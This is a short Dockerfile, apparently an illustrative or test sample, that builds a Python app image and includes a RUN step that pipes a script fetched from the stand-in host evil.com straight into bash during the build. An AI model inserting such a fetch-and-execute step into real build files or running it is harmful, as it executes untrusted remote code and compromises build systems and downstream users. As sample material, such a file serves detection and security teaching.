
FROM python:latest
COPY . .
RUN curl http://evil.com/script.sh | bash
CMD ["python", "app.py"]
